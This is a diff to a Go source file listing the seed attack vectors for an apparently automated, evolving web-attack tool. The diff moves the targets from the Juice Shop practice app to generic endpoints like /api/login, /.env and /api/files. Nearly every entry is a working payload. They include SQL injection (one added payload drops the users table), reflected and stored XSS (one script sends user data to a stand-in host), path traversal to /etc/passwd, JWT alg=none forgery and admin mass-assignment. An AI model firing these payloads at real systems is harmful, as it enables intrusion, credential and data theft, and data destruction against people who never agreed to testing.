@@ -17,59 +17,58 @@ type Genome struct {
 	RequiresNimble bool           `json:"requires_nimble,omitempty"`
 }
 
-// SeedGenomes is the Generation-1 starter population for the OWASP Juice
-// Shop target, mirroring evolution_loop.seed_genomes_for_generation_1 in
-// PRD.json. Order is significant: when --population is less than the full
-// list the control plane uses the first N entries deterministically, which
-// keeps demo runs reproducible.
+// SeedGenomes is the Generation-1 starter population of generic OWASP
+// Top 10 attack vectors. Order is significant: when --population is less
+// than the full list the control plane uses the first N entries
+// deterministically, which keeps demo runs reproducible.
 var SeedGenomes = []Genome{
 	{
 		Vector: "sqli_login", Category: "injection", Technique: "tautology",
-		TargetPath: "/rest/user/login",
-		Params:     map[string]any{"email_payload": "' OR 1=1--", "password": "x"},
-		Hint:       "Try classic auth bypass via SQL tautology in email field.",
+		TargetPath: "/api/login",
+		Params:     map[string]any{"username_payload": "' OR 1=1--", "password": "x"},
+		Hint:       "Try auth bypass via SQL tautology in login form.",
 	},
 	{
-		Vector: "sqli_login_union", Category: "injection", Technique: "union_select",
-		TargetPath: "/rest/user/login",
-		Params:     map[string]any{"email_payload": "' UNION SELECT 1,2,3,4,5--"},
-		Hint:       "Try UNION-based info leak.",
+		Vector: "sqli_search", Category: "injection", Technique: "union_select",
+		TargetPath: "/api/search",
+		Params:     map[string]any{"q_payload": "' UNION SELECT 1,2,3--"},
+		Hint:       "Try UNION-based info leak via search parameter.",
 	},
 	{
 		Vector: "xss_search_reflected", Category: "xss", Technique: "reflected",
-		TargetPath: "/#/search",
-		Params:     map[string]any{"q": "<iframe src=javascript:alert(1)>"},
+		TargetPath: "/search",
+		Params:     map[string]any{"q": "<script>alert(1)</script>"},
 		Hint:       "Try reflected XSS via search query parameter.",
 	},
 	{
-		Vector: "bola_users", Category: "access_control", Technique: "id_enumeration",
-		TargetPath: "/api/Users/1",
+		Vector: "bola_user_by_id", Category: "access_control", Technique: "id_enumeration",
+		TargetPath: "/api/users/1",
 		Params:     map[string]any{},
-		Hint:       "Try fetching admin user by ID without auth.",
+		Hint:       "Try fetching user record by ID without auth.",
 	},
 	{
-		Vector: "bola_baskets", Category: "access_control", Technique: "id_enumeration",
-		TargetPath: "/rest/basket/1",
+		Vector: "bola_resource_enum", Category: "access_control", Technique: "id_enumeration",
+		TargetPath: "/api/orders/1",
 		Params:     map[string]any{},
-		Hint:       "Try fetching another user's basket.",
+		Hint:       "Try enumerating resources by sequential ID.",
 	},
 	{
 		Vector: "jwt_alg_none", Category: "auth", Technique: "jwt_swap",
-		TargetPath: "/rest/user/whoami",
+		TargetPath: "/api/me",
 		Params:     map[string]any{"forge_alg": "none"},
-		Hint:       "Forge a JWT with alg=none claiming admin.",
+		Hint:       "Forge a JWT with alg=none claiming admin privileges.",
 	},
 	{
-		Vector: "path_traversal_ftp", Category: "data_exposure", Technique: "dotdot",
-		TargetPath: "/ftp",
-		Params:     map[string]any{"file": "../package.json.bak"},
-		Hint:       "Try directory traversal in /ftp listing.",
+		Vector: "path_traversal", Category: "data_exposure", Technique: "dotdot",
+		TargetPath: "/api/files",
+		Params:     map[string]any{"file": "../../../etc/passwd"},
+		Hint:       "Try directory traversal to read sensitive files.",
 	},
 	{
-		Vector: "data_exposure_pkgjson", Category: "data_exposure", Technique: "direct_get",
-		TargetPath: "/ftp/package.json.bak",
+		Vector: "data_exposure_env", Category: "data_exposure", Technique: "direct_get",
+		TargetPath: "/.env",
 		Params:     map[string]any{},
-		Hint:       "Direct fetch of package.json backup.",
+		Hint:       "Direct fetch of .env file for leaked secrets.",
 	},
 	{
 		Vector: "data_exposure_robots", Category: "data_exposure", Technique: "direct_get",
@@ -78,45 +77,45 @@ var SeedGenomes = []Genome{
 		Hint:       "Read robots.txt for disallowed paths.",
 	},
 	{
-		Vector: "admin_section", Category: "access_control", Technique: "force_browse",
-		TargetPath:     "/#/administration",
+		Vector: "admin_panel", Category: "access_control", Technique: "force_browse",
+		TargetPath:     "/admin",
 		Params:         map[string]any{},
-		Hint:           "Try to reach admin UI directly.",
+		Hint:           "Try to reach admin panel directly.",
 		RequiresNimble: true,
 	},
 	{
-		Vector: "feedback_xss_stored", Category: "xss", Technique: "stored",
-		TargetPath: "/api/Feedbacks",
+		Vector: "stored_xss_comment", Category: "xss", Technique: "stored",
+		TargetPath: "/api/comments",
 		Params: map[string]any{
-			"comment_payload": "<script>fetch('/api/Users').then(r=>r.text()).then(t=>fetch('//x/?d='+btoa(t)))</script>",
+			"comment_payload": "<script>fetch('/api/users').then(r=>r.text()).then(t=>fetch('//x/?d='+btoa(t)))</script>",
 		},
-		Hint: "Try stored XSS in feedback comment field.",
+		Hint: "Try stored XSS in a user-submitted text field.",
 	},
 	{
-		Vector: "register_admin_role", Category: "auth", Technique: "param_pollution",
-		TargetPath: "/api/Users",
+		Vector: "mass_assign_role", Category: "auth", Technique: "param_pollution",
+		TargetPath: "/api/register",
 		Params: map[string]any{"body": map[string]any{
 			"email": "z+<rand>@oz.dev", "password": "p", "role": "admin",
 		}},
 		Hint: "Mass-assign role=admin during registration.",
 	},
 	{
-		Vector: "rest_products_search_sqli", Category: "injection", Technique: "error_based",
-		TargetPath: "/rest/products/search",
-		Params:     map[string]any{"q_payload": "')) UNION SELECT name,id,price,description,image,deluxePrice,createdAt,updatedAt,deletedAt FROM Users--"},
-		Hint:       "Classic Juice Shop search SQLi for user table leak.",
+		Vector: "sqli_error_based", Category: "injection", Technique: "error_based",
+		TargetPath: "/api/products",
+		Params:     map[string]any{"q_payload": "' OR 1=1; DROP TABLE users--"},
+		Hint:       "Try error-based SQL injection via search/filter parameter.",
 	},
 	{
 		Vector: "captcha_bypass", Category: "validation", Technique: "skip_token",
-		TargetPath: "/api/Feedbacks",
+		TargetPath: "/api/contact",
 		Params:     map[string]any{"omit_captcha": true},
-		Hint:       "Submit feedback without captcha token.",
+		Hint:       "Submit form without captcha token.",
 	},
 	{
-		Vector: "score_board", Category: "data_exposure", Technique: "force_browse",
-		TargetPath:     "/#/score-board",
+		Vector: "hidden_routes", Category: "data_exposure", Technique: "force_browse",
+		TargetPath:     "/api/debug",
 		Params:         map[string]any{},
-		Hint:           "Find the hidden score-board route.",
+		Hint:           "Probe for hidden debug/admin routes.",
 		RequiresNimble: true,
 	},
 }
